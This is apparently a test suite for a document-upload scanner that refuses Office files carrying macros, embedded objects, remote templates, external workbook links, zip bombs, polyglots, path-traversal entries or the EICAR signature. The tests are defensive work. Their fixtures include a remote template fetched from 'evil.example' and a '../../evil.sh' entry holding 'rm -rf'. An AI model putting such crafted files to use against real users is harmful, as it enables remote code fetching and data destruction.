import { describe, expect, test } from "bun:test";
import {
  buildDocx,
  buildPptx,
  buildXlsx,
  buildZip,
} from "@studafy/test-support";
import {
  analyzeBytes,
  detectOoxmlMediaType,
  DOCX_MEDIA_TYPE,
  EICAR_SIGNATURE,
  parseOoxml,
  PPTX_MEDIA_TYPE,
  XLSX_MEDIA_TYPE,
} from "../src";

/**
 * Word and PowerPoint uploads (ADR-0037). A lesson file is accepted only as
 * plain document parts: no macros, no embedded objects, nothing fetched
 * from elsewhere when it opens, and nothing that inflates without bound.
 */
describe("Office documents", () => {
  const docx = () =>
    buildDocx([{ heading: "Cells" }, {
      paragraph: "A cell is the unit of life.",
    }]);

  test("a plain Word file and a plain slide deck are clean", async () => {
    expect(detectOoxmlMediaType(docx())).toBe(DOCX_MEDIA_TYPE);
    const deck = buildPptx([{ title: "Cells", lines: ["Nucleus"] }]);
    expect(detectOoxmlMediaType(deck)).toBe(PPTX_MEDIA_TYPE);
    expect(await analyzeBytes(docx(), DOCX_MEDIA_TYPE)).toEqual({
      verdict: "clean",
    });
    expect(await analyzeBytes(deck, PPTX_MEDIA_TYPE)).toEqual({
      verdict: "clean",
    });
  });

  test("a Word file declared as slides is refused", async () => {
    expect((await analyzeBytes(docx(), PPTX_MEDIA_TYPE)).verdict).toBe(
      "malformed",
    );
  });

  test("any other ZIP is not an accepted type", () => {
    expect(
      detectOoxmlMediaType(buildZip([{ name: "notes.txt", data: "hi" }])),
    ).toBeNull();
  });

  test("macros are refused, by part and by content type", () => {
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraParts: [{ name: "word/vbaProject.bin", data: "macro" }],
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraContentTypes:
            '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>',
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("embedded objects and ActiveX are refused", () => {
    expect(
      parseOoxml(
        buildPptx([{ title: "x" }], {
          extraParts: [{ name: "ppt/embeddings/oleObject1.bin", data: "ole" }],
        }),
        "pptx",
      ),
    ).toEqual({ ok: false, reason: "embedded" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          extraParts: [{ name: "word/activeX/activeX1.xml", data: "<x/>" }],
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("a remote template is refused; an ordinary hyperlink is kept", () => {
    const rels = (type: string) =>
      `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`;
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], {
          documentRels: rels("attachedTemplate"),
        }),
        "docx",
      ),
    ).toEqual({ ok: false, reason: "external_reference" });
    expect(
      parseOoxml(
        buildDocx([{ paragraph: "x" }], { documentRels: rels("hyperlink") }),
        "docx",
      ).ok,
    ).toBe(true);
  });

  test("the EICAR test file inside a part is malicious", async () => {
    const infected = buildDocx([{ paragraph: EICAR_SIGNATURE }]);
    expect(await analyzeBytes(infected, DOCX_MEDIA_TYPE)).toEqual({
      verdict: "malicious",
      errorCode: "malware_detected",
    });
  });

  test("bytes before or after the ZIP make it a polyglot", () => {
    const file = docx();
    const appended = new Uint8Array([...file, 0x25, 0x50, 0x44, 0x46]);
    expect(parseOoxml(appended, "docx")).toEqual({
      ok: false,
      reason: "polyglot",
    });
  });

  test("a part that inflates far past its size is a bomb", () => {
    const bomb = buildDocx([{ paragraph: "x" }], {
      extraParts: [{ name: "word/big.xml", data: "a".repeat(5_000_000) }],
    });
    expect(parseOoxml(bomb, "docx")).toEqual({
      ok: false,
      reason: "decompression_limit",
    });
  });

  test("a part whose size lies is malformed", () => {
    const file = docx();
    // Raise the first central-directory entry's uncompressed size by one.
    const forged = file.slice();
    const first = forged.findIndex((_, i) =>
      forged[i] === 0x50 && forged[i + 1] === 0x4b &&
      forged[i + 2] === 0x01 && forged[i + 3] === 0x02
    );
    expect(first).toBeGreaterThan(0);
    forged[first + 24] = (forged[first + 24]! + 1) & 0xff;
    expect(parseOoxml(forged, "docx").ok).toBe(false);
  });

  test("unsafe part names are refused", () => {
    const traversal = buildZip([
      { name: "[Content_Types].xml", data: "<Types/>" },
      { name: "word/document.xml", data: "<w:document/>" },
      { name: "../../evil.sh", data: "rm -rf" },
    ]);
    expect(parseOoxml(traversal, "docx")).toEqual({
      ok: false,
      reason: "malformed",
    });
  });
});

/**
 * Excel workbooks (DL-077): the same bounded walk, plus what only a
 * workbook carries - Excel 4.0 macro sheets, links to other workbooks, data
 * connections - and only the plain workbook content type.
 */
describe("Excel workbooks", () => {
  const sheet = { name: "Marks", rows: [["Name", "Score"], ["Lina", 18]] };
  const xlsx = (options: Parameters<typeof buildXlsx>[1] = {}) =>
    buildXlsx([sheet], options);

  test("a plain workbook is detected and clean", async () => {
    expect(detectOoxmlMediaType(xlsx())).toBe(XLSX_MEDIA_TYPE);
    expect(await analyzeBytes(xlsx(), XLSX_MEDIA_TYPE)).toEqual({
      verdict: "clean",
    });
  });

  test("a workbook declared as Word, or Word declared as a workbook, is refused", async () => {
    expect((await analyzeBytes(xlsx(), DOCX_MEDIA_TYPE)).verdict).toBe(
      "malformed",
    );
    const docx = buildDocx([{ paragraph: "x" }]);
    expect((await analyzeBytes(docx, XLSX_MEDIA_TYPE)).verdict).toBe(
      "malformed",
    );
  });

  test("a macro-enabled workbook is refused, by content type and by part", async () => {
    expect(
      await analyzeBytes(
        xlsx({
          mainContentType:
            "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
        }),
        XLSX_MEDIA_TYPE,
      ),
    ).toEqual({ verdict: "policy_rejected", errorCode: "active_content" });
    expect(
      parseOoxml(
        xlsx({ extraParts: [{ name: "xl/vbaProject.bin", data: "macro" }] }),
        "xlsx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("Excel 4.0 macro sheets and dialog sheets are refused", () => {
    for (
      const name of [
        "xl/macrosheets/sheet1.xml",
        "xl/intlMacrosheets/sheet1.xml",
        "xl/dialogsheets/sheet1.xml",
      ]
    ) {
      expect(
        parseOoxml(xlsx({ extraParts: [{ name, data: "<x/>" }] }), "xlsx"),
      ).toEqual({ ok: false, reason: "active_content" });
    }
    expect(
      parseOoxml(
        xlsx({
          extraContentTypes:
            '<Override PartName="/xl/foo.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        }),
        "xlsx",
      ),
    ).toEqual({ ok: false, reason: "active_content" });
  });

  test("a template or a workbook with no main content type is not a plain workbook", () => {
    expect(
      parseOoxml(
        xlsx({
          mainContentType:
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
        }),
        "xlsx",
      ),
    ).toEqual({ ok: false, reason: "malformed" });
  });

  test("links to other workbooks, data connections and web queries are refused", () => {
    for (
      const name of [
        "xl/externalLinks/externalLink1.xml",
        "xl/connections.xml",
        "xl/queryTables/queryTable1.xml",
      ]
    ) {
      expect(
        parseOoxml(xlsx({ extraParts: [{ name, data: "<x/>" }] }), "xlsx"),
      ).toEqual({ ok: false, reason: "external_reference" });
    }
    const remote =
      `<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="https://evil.example/book.xlsx" TargetMode="External"/></Relationships>`;
    expect(
      parseOoxml(
        xlsx({
          extraParts: [{
            name: "xl/externalLinks/_rels/externalLink1.xml.rels",
            data: remote,
          }],
        }),
        "xlsx",
      ),
    ).toEqual({ ok: false, reason: "external_reference" });
  });

  test("embedded objects are refused", () => {
    expect(
      parseOoxml(
        xlsx({
          extraParts: [{ name: "xl/embeddings/oleObject1.bin", data: "ole" }],
        }),
        "xlsx",
      ),
    ).toEqual({ ok: false, reason: "embedded" });
  });

  test("a sheet that inflates far past its size is a bomb", async () => {
    const bomb = xlsx({
      extraParts: [{
        name: "xl/worksheets/sheet9.xml",
        data: "<row/>".repeat(1_000_000),
      }],
    });
    expect(parseOoxml(bomb, "xlsx")).toEqual({
      ok: false,
      reason: "decompression_limit",
    });
    expect(await analyzeBytes(bomb, XLSX_MEDIA_TYPE)).toEqual({
      verdict: "policy_rejected",
      errorCode: "decompression_limit",
    });
  });

  test("the EICAR test file in a cell is malicious", async () => {
    const infected = buildXlsx([{ name: "x", rows: [[EICAR_SIGNATURE]] }]);
    expect(await analyzeBytes(infected, XLSX_MEDIA_TYPE)).toEqual({
      verdict: "malicious",
      errorCode: "malware_detected",
    });
  });
});
